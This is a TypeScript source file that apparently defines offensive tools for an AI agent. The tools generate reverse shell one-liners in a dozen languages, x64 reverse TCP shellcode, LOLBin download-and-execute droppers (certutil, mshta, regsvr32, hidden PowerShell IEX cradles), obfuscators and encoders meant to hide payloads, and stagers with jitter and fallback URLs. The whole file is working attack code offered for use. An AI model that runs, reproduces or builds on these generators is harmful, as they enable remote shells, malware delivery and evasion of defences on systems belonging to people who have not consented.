import { Tool } from './Tool.js';
import * as crypto from 'crypto';

// ─── 1. Reverse Shell Generator ─────────────────────────────────────────────────
export class ReverseShellGenTool implements Tool {
    name = 'generate_reverse_shell';
    description = 'Generate reverse shell one-liners in multiple languages. Returns copy-pasteable commands.';
    schema = {
        type: 'object',
        properties: {
            lhost: { type: 'string', description: 'Listener IP address' },
            lport: { type: 'number', description: 'Listener port' },
            language: { type: 'string', enum: ['bash', 'python', 'perl', 'ruby', 'php', 'powershell', 'nodejs', 'java', 'csharp', 'go', 'netcat', 'socat', 'all'], description: 'Language/tool for the reverse shell' }
        },
        required: ['lhost', 'lport', 'language'],
        additionalProperties: false
    };

    async execute(args: { lhost: string; lport: number; language: string }): Promise<string> {
        const { lhost, lport } = args;
        const shells: Record<string, string[]> = {
            bash: [
                `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`,
                `bash -c 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'`,
                `0<&196;exec 196<>/dev/tcp/${lhost}/${lport}; sh <&196 >&196 2>&196`,
                `exec 5<>/dev/tcp/${lhost}/${lport};cat <&5 | while read line; do $line 2>&5 >&5; done`,
            ],
            python: [
                `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
                `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("${lhost}",${lport}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'`,
            ],
            perl: [
                `perl -e 'use Socket;$i="${lhost}";$p=${lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
                `perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"${lhost}:${lport}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`,
            ],
            ruby: [
                `ruby -rsocket -e'f=TCPSocket.open("${lhost}",${lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
                `ruby -rsocket -e'exit if fork;c=TCPSocket.new("${lhost}","${lport}");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'`,
            ],
            php: [
                `php -r '$sock=fsockopen("${lhost}",${lport});exec("/bin/sh -i <&3 >&3 2>&3");'`,
                `php -r '$sock=fsockopen("${lhost}",${lport});$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'`,
            ],
            powershell: [
                `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${lhost}',${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
                `powershell -e ${Buffer.from(`$client = New-Object System.Net.Sockets.TCPClient("${lhost}",${lport});$stream = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $stream.Read($b, 0, $b.Length)) -ne 0){$data = (New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$sb = (iex $data 2>&1 | Out-String);$sb2 = $sb + "PS " + (pwd).Path + "> ";$sb3 = ([text.encoding]::ASCII).GetBytes($sb2);$stream.Write($sb3,0,$sb3.Length);$stream.Flush()};$client.Close()`, 'utf-16le').toString('base64')}`,
            ],
            nodejs: [
                `node -e '(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(${lport},"${lhost}",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})()'`,
            ],
            java: [
                `Runtime r = Runtime.getRuntime(); Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/${lhost}/${lport};cat <&5 | while read line; do \\$line 2>&5 >&5; done'"); p.waitFor();`,
            ],
            csharp: [
                `using System;using System.Diagnostics;using System.Net.Sockets;class C{static void Main(){using(TcpClient c=new TcpClient("${lhost}",${lport})){using(var s=c.GetStream()){byte[] b=new byte[1024];int i;Process p=new Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.RedirectStandardInput=true;p.StartInfo.RedirectStandardOutput=true;p.StartInfo.RedirectStandardError=true;p.StartInfo.UseShellExecute=false;p.Start();var sw=p.StandardInput;while((i=s.Read(b,0,b.Length))!=0){string d=System.Text.Encoding.ASCII.GetString(b,0,i);sw.WriteLine(d);sw.Flush();}}}}`,
            ],
            go: [
                `echo 'package main;import("net";"os/exec");func main(){c,_:=net.Dial("tcp","${lhost}:${lport}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/r.go && go run /tmp/r.go`,
            ],
            netcat: [
                `nc -e /bin/sh ${lhost} ${lport}`,
                `nc -e /bin/bash ${lhost} ${lport}`,
                `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${lhost} ${lport} >/tmp/f`,
                `nc ${lhost} ${lport} | /bin/sh | nc ${lhost} ${lport + 1}`,
            ],
            socat: [
                `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${lhost}:${lport}`,
                `socat tcp-connect:${lhost}:${lport} exec:/bin/sh,pty,stderr,setsid,sigint,sane`,
            ],
        };

        if (args.language === 'all') {
            const lines: string[] = [`[REVERSE SHELLS] ${lhost}:${lport}`, ''];
            for (const [lang, cmds] of Object.entries(shells)) {
                lines.push(`── ${lang.toUpperCase()} ──`);
                cmds.forEach((c, i) => lines.push(`  [${i + 1}] ${c}`));
                lines.push('');
            }
            return lines.join('\n');
        }

        const cmds = shells[args.language];
        if (!cmds) return `[ERROR]: Unknown language "${args.language}". Supported: ${Object.keys(shells).join(', ')}`;

        const lines = [`[REVERSE SHELL — ${args.language.toUpperCase()}] ${lhost}:${lport}`, ''];
        cmds.forEach((c, i) => lines.push(`[${i + 1}] ${c}`));
        lines.push('');
        lines.push(`Listener: nc -lvnp ${lport}`);
        return lines.join('\n');
    }
}

// ─── 2. Shellcode Generator ─────────────────────────────────────────────────────
export class ShellcodeGenTool implements Tool {
    name = 'generate_shellcode';
    description = 'Generate x64 reverse TCP shellcode templates with optional XOR/AES encoding. Template-based with IP/port substitution.';
    schema = {
        type: 'object',
        properties: {
            lhost: { type: 'string', description: 'Listener IP' },
            lport: { type: 'number', description: 'Listener port' },
            format: { type: 'string', enum: ['raw_hex', 'c_array', 'python', 'powershell_base64', 'csharp'], description: 'Output format' },
            encoder: { type: 'string', enum: ['none', 'xor'], description: 'Encoding method (default: none)' }
        },
        required: ['lhost', 'lport', 'format'],
        additionalProperties: false
    };

    async execute(args: { lhost: string; lport: number; format: string; encoder?: string }): Promise<string> {
        // x64 Linux reverse TCP shell template
        // Positions: IP at offset 0x2C (4 bytes), Port at offset 0x24 (2 bytes, network order)
        const template = Buffer.from([
            0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x0f, 0x05,
            0x48, 0x97, 0x48, 0xb9, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x51, 0x48, 0x89, 0xe6, 0x6a, 0x10, 0x5a, 0x6a, 0x2a, 0x58, 0x0f, 0x05,
            0x6a, 0x03, 0x5e, 0x48, 0xff, 0xce, 0x6a, 0x21, 0x58, 0x0f, 0x05, 0x75,
            0xf6, 0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f,
            0x73, 0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x52, 0x57, 0x48, 0x89, 0xe6,
            0x0f, 0x05
        ]);

        // Patch port (offset 0x12, 2 bytes big-endian)
        template.writeUInt16BE(args.lport, 0x12);

        // Patch IP (offset 0x14, 4 bytes)
        const ipParts = args.lhost.split('.').map(Number);
        if (ipParts.length === 4 && ipParts.every(p => p >= 0 && p <= 255)) {
            template[0x14] = ipParts[0];
            template[0x15] = ipParts[1];
            template[0x16] = ipParts[2];
            template[0x17] = ipParts[3];
        }

        let payload = Buffer.from(template);
        let decoderInfo = '';

        if (args.encoder === 'xor') {
            const key = crypto.randomBytes(1)[0] || 0x41;
            // Avoid null bytes and the key itself
            payload = Buffer.from(payload.map(b => b ^ key));
            decoderInfo = `\n// XOR key: 0x${key.toString(16).padStart(2, '0')}\n// Decode: for(int i=0;i<len;i++) buf[i]^=0x${key.toString(16).padStart(2, '0')};`;
        }

        const lines: string[] = [`[SHELLCODE] x64 reverse TCP → ${args.lhost}:${args.lport}`, `// ${payload.length} bytes${args.encoder === 'xor' ? ' (XOR encoded)' : ''}`, decoderInfo, ''];

        switch (args.format) {
            case 'raw_hex':
                lines.push(payload.toString('hex').match(/.{1,32}/g)?.join('\n') || '');
                break;
            case 'c_array':
                lines.push(`unsigned char shellcode[] = {`);
                const hexBytes = Array.from(payload).map(b => `0x${b.toString(16).padStart(2, '0')}`);
                for (let i = 0; i < hexBytes.length; i += 12) {
                    lines.push(`    ${hexBytes.slice(i, i + 12).join(', ')}${i + 12 < hexBytes.length ? ',' : ''}`);
                }
                lines.push(`}; // ${payload.length} bytes`);
                break;
            case 'python':
                lines.push(`shellcode = b""`);
                const pyHex = Array.from(payload).map(b => `\\x${b.toString(16).padStart(2, '0')}`);
                for (let i = 0; i < pyHex.length; i += 16) {
                    lines.push(`shellcode += b"${pyHex.slice(i, i + 16).join('')}"`);
                }
                break;
            case 'powershell_base64':
                lines.push(`[Byte[]]$buf = [System.Convert]::FromBase64String("${payload.toString('base64')}")`);
                break;
            case 'csharp':
                lines.push(`byte[] buf = new byte[${payload.length}] {`);
                const csBytes = Array.from(payload).map(b => `0x${b.toString(16).padStart(2, '0')}`);
                for (let i = 0; i < csBytes.length; i += 12) {
                    lines.push(`    ${csBytes.slice(i, i + 12).join(', ')}${i + 12 < csBytes.length ? ',' : ''}`);
                }
                lines.push('};');
                break;
            default:
                return `[ERROR]: Unknown format "${args.format}"`;
        }

        return lines.join('\n');
    }
}

// ─── 3. Dropper Generator ───────────────────────────────────────────────────────
export class DropperGenTool implements Tool {
    name = 'generate_dropper';
    description = 'Generate download-and-execute dropper commands using LOLBins and scripting hosts.';
    schema = {
        type: 'object',
        properties: {
            payload_url: { type: 'string', description: 'URL to download payload from' },
            method: { type: 'string', enum: ['powershell_cradle', 'certutil', 'mshta', 'msbuild', 'vbs', 'hta', 'bitsadmin', 'curl', 'regsvr32', 'all'], description: 'Dropper method' },
            output_path: { type: 'string', description: 'Local path to save payload (default: %TEMP%\\payload.exe)' },
            obfuscate: { type: 'boolean', description: 'Apply basic obfuscation (default: false)' }
        },
        required: ['payload_url', 'method'],
        additionalProperties: false
    };

    async execute(args: { payload_url: string; method: string; output_path?: string; obfuscate?: boolean }): Promise<string> {
        const url = args.payload_url;
        const out = args.output_path || '%TEMP%\\\\payload.exe';

        const droppers: Record<string, string> = {
            powershell_cradle: `powershell -nop -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('${url}')"`,
            certutil: `certutil -urlcache -split -f "${url}" ${out} && ${out}`,
            mshta: `mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -ep bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString('${url}')"", 0:close")`,
            msbuild: `<!-- Save as build.csproj -->\n<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">\n  <Target Name="Build">\n    <Exec Command="powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('${url}')" />\n  </Target>\n</Project>\n\n<!-- Execute: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe build.csproj -->`,
            vbs: `Set x = CreateObject("Microsoft.XMLHTTP")\nx.Open "GET", "${url}", False\nx.Send\nSet s = CreateObject("ADODB.Stream")\ns.Open\ns.Type = 1\ns.Write x.responseBody\ns.SaveToFile "${out}", 2\ns.Close\nSet w = CreateObject("WScript.Shell")\nw.Run "${out}"`,
            hta: `<html><body><script language="VBScript">\nSet o = CreateObject("Wscript.Shell")\no.Run "powershell -nop -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('${url}')"\nself.close\n</script></body></html>`,
            bitsadmin: `bitsadmin /transfer job /download /priority high ${url} ${out} && ${out}`,
            curl: `curl -o ${out} ${url} && ${out}`,
            regsvr32: `regsvr32 /s /n /u /i:${url} scrobj.dll`,
        };

        if (args.method === 'all') {
            const lines = [`[DROPPERS] payload: ${url}`, ''];
            for (const [name, cmd] of Object.entries(droppers)) {
                lines.push(`── ${name.toUpperCase()} ──`);
                lines.push(cmd);
                lines.push('');
            }
            return lines.join('\n');
        }

        const cmd = droppers[args.method];
        if (!cmd) return `[ERROR]: Unknown method "${args.method}". Supported: ${Object.keys(droppers).join(', ')}`;

        let output = cmd;
        if (args.obfuscate) {
            output = this.obfuscateBasic(output);
        }

        return [`[DROPPER — ${args.method.toUpperCase()}]`, '', output].join('\n');
    }

    private obfuscateBasic(cmd: string): string {
        // Simple char-code splitting for PowerShell content
        if (cmd.includes('powershell')) {
            const varName = `$${crypto.randomBytes(4).toString('hex')}`;
            return cmd.replace(
                /IEX\(New-Object Net\.WebClient\)\.DownloadString/,
                `${varName}='IEX(New-Object Net.WebClient).DownloadString';Invoke-Expression ${varName}`
            );
        }
        return cmd;
    }
}

// ─── 4. Payload Obfuscator ──────────────────────────────────────────────────────
export class PayloadObfuscateTool implements Tool {
    name = 'obfuscate_payload';
    description = 'Obfuscate a payload string using various techniques. Returns obfuscated version with decoder stub.';
    schema = {
        type: 'object',
        properties: {
            payload: { type: 'string', description: 'Payload string to obfuscate' },
            technique: { type: 'string', enum: ['base64_layers', 'char_code_split', 'variable_randomize', 'string_concat', 'xor_encode'], description: 'Obfuscation technique' }
        },
        required: ['payload', 'technique'],
        additionalProperties: false
    };

    async execute(args: { payload: string; technique: string }): Promise<string> {
        const { payload, technique } = args;
        let result = '';

        switch (technique) {
            case 'base64_layers': {
                const b1 = Buffer.from(payload).toString('base64');
                const b2 = Buffer.from(b1).toString('base64');
                result = [
                    '# Double base64 encoded payload',
                    `# Decode: echo "${b2}" | base64 -d | base64 -d`,
                    '',
                    `# PowerShell:`,
                    `[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("${b2}"))))`,
                    '',
                    `# Python:`,
                    `import base64; exec(base64.b64decode(base64.b64decode("${b2}")))`,
                    '',
                    `# Encoded payload:`,
                    b2,
                ].join('\n');
                break;
            }
            case 'char_code_split': {
                const codes = Array.from(payload).map(c => c.charCodeAt(0));
                result = [
                    '# PowerShell char-code reconstruction:',
                    `$c = @(${codes.join(',')})`,
                    `$s = -join ($c | ForEach-Object { [char]$_ })`,
                    `IEX $s`,
                    '',
                    '# Python:',
                    `exec(''.join(chr(c) for c in [${codes.join(',')}]))`,
                ].join('\n');
                break;
            }
            case 'variable_randomize': {
                const vars: string[] = [];
                const chunks = payload.match(/.{1,10}/g) || [payload];
                const assignments: string[] = [];
                for (const chunk of chunks) {
                    const v = `$${crypto.randomBytes(3).toString('hex')}`;
                    vars.push(v);
                    assignments.push(`${v}="${chunk}"`);
                }
                result = [
                    '# PowerShell variable randomization:',
                    ...assignments,
                    `$cmd = ${vars.join('+')}`,
                    `IEX $cmd`,
                ].join('\n');
                break;
            }
            case 'string_concat': {
                const pieces = payload.match(/.{1,5}/g) || [payload];
                const concatParts = pieces.map(p => `"${p}"`).join('+');
                result = [
                    '# PowerShell string concatenation:',
                    `$payload = ${concatParts}`,
                    `IEX $payload`,
                    '',
                    '# Python:',
                    `exec(${pieces.map(p => `"${p}"`).join('+')})`,
                ].join('\n');
                break;
            }
            case 'xor_encode': {
                const key = crypto.randomBytes(1)[0] || 0x42;
                const encoded = Array.from(Buffer.from(payload)).map(b => b ^ key);
                result = [
                    `# XOR encoded (key: 0x${key.toString(16).padStart(2, '0')})`,
                    '',
                    '# PowerShell decoder:',
                    `$key = 0x${key.toString(16).padStart(2, '0')}`,
                    `$enc = @(${encoded.join(',')})`,
                    `$dec = -join ($enc | ForEach-Object { [char]($_ -bxor $key) })`,
                    `IEX $dec`,
                    '',
                    '# Python decoder:',
                    `key = 0x${key.toString(16).padStart(2, '0')}`,
                    `enc = bytes([${encoded.join(',')}])`,
                    `exec(bytes(b ^ key for b in enc).decode())`,
                ].join('\n');
                break;
            }
            default:
                return `[ERROR]: Unknown technique "${technique}"`;
        }

        return `[OBFUSCATED PAYLOAD — ${technique.toUpperCase()}]\n\n${result}`;
    }
}

// ─── 5. Payload Encoder ─────────────────────────────────────────────────────────
export class PayloadEncodeTool implements Tool {
    name = 'encode_payload';
    description = 'Multi-format payload encoding with decoder information.';
    schema = {
        type: 'object',
        properties: {
            payload: { type: 'string', description: 'Payload to encode' },
            encoding: { type: 'string', enum: ['base64', 'hex', 'xor', 'url', 'unicode', 'rot13'], description: 'Encoding method' },
            key: { type: 'string', description: 'Key for XOR encoding (optional, random if not specified)' }
        },
        required: ['payload', 'encoding'],
        additionalProperties: false
    };

    async execute(args: { payload: string; encoding: string; key?: string }): Promise<string> {
        const { payload, encoding } = args;
        let encoded = '';
        let decoder = '';

        switch (encoding) {
            case 'base64':
                encoded = Buffer.from(payload).toString('base64');
                decoder = `echo "${encoded}" | base64 -d\npowershell [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("${encoded}"))`;
                break;
            case 'hex':
                encoded = Buffer.from(payload).toString('hex');
                decoder = `echo "${encoded}" | xxd -r -p\npython3 -c "print(bytes.fromhex('${encoded}').decode())"`;
                break;
            case 'xor': {
                const keyByte = args.key ? args.key.charCodeAt(0) : crypto.randomBytes(1)[0] || 0x42;
                const xored = Array.from(Buffer.from(payload)).map(b => (b ^ keyByte).toString(16).padStart(2, '0')).join('');
                encoded = xored;
                decoder = `Key: 0x${keyByte.toString(16).padStart(2, '0')}\npython3 -c "print(bytes(b^0x${keyByte.toString(16).padStart(2, '0')} for b in bytes.fromhex('${xored}')).decode())"`;
                break;
            }
            case 'url':
                encoded = encodeURIComponent(payload);
                decoder = `python3 -c "from urllib.parse import unquote; print(unquote('${encoded}'))"`;
                break;
            case 'unicode':
                encoded = Array.from(payload).map(c => `\\u${c.charCodeAt(0).toString(16).padStart(4, '0')}`).join('');
                decoder = `python3 -c "print('${encoded}')"`;
                break;
            case 'rot13':
                encoded = payload.replace(/[a-zA-Z]/g, c => {
                    const base = c <= 'Z' ? 65 : 97;
                    return String.fromCharCode(((c.charCodeAt(0) - base + 13) % 26) + base);
                });
                decoder = `echo "${encoded}" | tr 'A-Za-z' 'N-ZA-Mn-za-m'`;
                break;
            default:
                return `[ERROR]: Unknown encoding "${encoding}"`;
        }

        return [`[ENCODED PAYLOAD — ${encoding.toUpperCase()}]`, '', 'Encoded:', encoded, '', 'Decoder:', decoder].join('\n');
    }
}

// ─── 6. Stager Generator ────────────────────────────────────────────────────────
export class StagerGenTool implements Tool {
    name = 'stager_generate';
    description = 'Generate stage-0 download cradles with jitter, retry, and fallback URL support.';
    schema = {
        type: 'object',
        properties: {
            urls: { type: 'array', items: { type: 'string' }, description: 'Array of payload URLs (fallback order)' },
            jitter_ms: { type: 'number', description: 'Jitter between retries in ms (default 1000)' },
            retry_count: { type: 'number', description: 'Number of retries per URL (default 3)' },
            language: { type: 'string', enum: ['powershell', 'python', 'bash', 'vbs'], description: 'Stager language' }
        },
        required: ['urls', 'language'],
        additionalProperties: false
    };

    async execute(args: { urls: string[]; jitter_ms?: number; retry_count?: number; language: string }): Promise<string> {
        const jitter = args.jitter_ms ?? 1000;
        const retries = args.retry_count ?? 3;
        const urls = args.urls;

        let stager = '';
        switch (args.language) {
            case 'powershell':
                stager = [
                    `$urls = @(${urls.map(u => `"${u}"`).join(', ')})`,
                    `$retries = ${retries}`,
                    `$jitter = ${jitter}`,
                    `foreach ($url in $urls) {`,
                    `    for ($i = 0; $i -lt $retries; $i++) {`,
                    `        try {`,
                    `            $wc = New-Object Net.WebClient`,
                    `            $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")`,
                    `            $payload = $wc.DownloadString($url)`,
                    `            IEX $payload`,
                    `            exit`,
                    `        } catch {`,
                    `            $sleep = Get-Random -Min ($jitter * 0.5) -Max ($jitter * 1.5)`,
                    `            Start-Sleep -Milliseconds $sleep`,
                    `        }`,
                    `    }`,
                    `}`,
                ].join('\n');
                break;
            case 'python':
                stager = [
                    `import urllib.request, time, random`,
                    `urls = [${urls.map(u => `"${u}"`).join(', ')}]`,
                    `for url in urls:`,
                    `    for attempt in range(${retries}):`,
                    `        try:`,
                    `            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})`,
                    `            data = urllib.request.urlopen(req).read().decode()`,
                    `            exec(data)`,
                    `            exit()`,
                    `        except:`,
                    `            time.sleep(random.uniform(${jitter * 0.5 / 1000}, ${jitter * 1.5 / 1000}))`,
                ].join('\n');
                break;
            case 'bash':
                stager = [
                    `#!/bin/bash`,
                    `URLS=(${urls.map(u => `"${u}"`).join(' ')})`,
                    `RETRIES=${retries}`,
                    `for url in "\${URLS[@]}"; do`,
                    `    for ((i=0; i<RETRIES; i++)); do`,
                    `        payload=$(curl -s -A "Mozilla/5.0" "$url" 2>/dev/null)`,
                    `        if [ $? -eq 0 ] && [ -n "$payload" ]; then`,
                    `            eval "$payload"`,
                    `            exit 0`,
                    `        fi`,
                    `        sleep $(awk "BEGIN{srand();print ${jitter / 1000}*(0.5+rand())}")`,
                    `    done`,
                    `done`,
                ].join('\n');
                break;
            case 'vbs':
                stager = [
                    `Dim urls, i, j, http, payload`,
                    `urls = Array(${urls.map(u => `"${u}"`).join(', ')})`,
                    `For Each url In urls`,
                    `    For j = 1 To ${retries}`,
                    `        On Error Resume Next`,
                    `        Set http = CreateObject("MSXML2.XMLHTTP")`,
                    `        http.Open "GET", url, False`,
                    `        http.setRequestHeader "User-Agent", "Mozilla/5.0"`,
                    `        http.Send`,
                    `        If Err.Number = 0 And http.Status = 200 Then`,
                    `            payload = http.responseText`,
                    `            Execute payload`,
                    `            WScript.Quit`,
                    `        End If`,
                    `        On Error GoTo 0`,
                    `        WScript.Sleep ${jitter}`,
                    `    Next`,
                    `Next`,
                ].join('\n');
                break;
            default:
                return `[ERROR]: Unknown language "${args.language}"`;
        }

        return [`[STAGER — ${args.language.toUpperCase()}]`, `URLs: ${urls.length} | Retries: ${retries} | Jitter: ${jitter}ms`, '', stager].join('\n');
    }
}
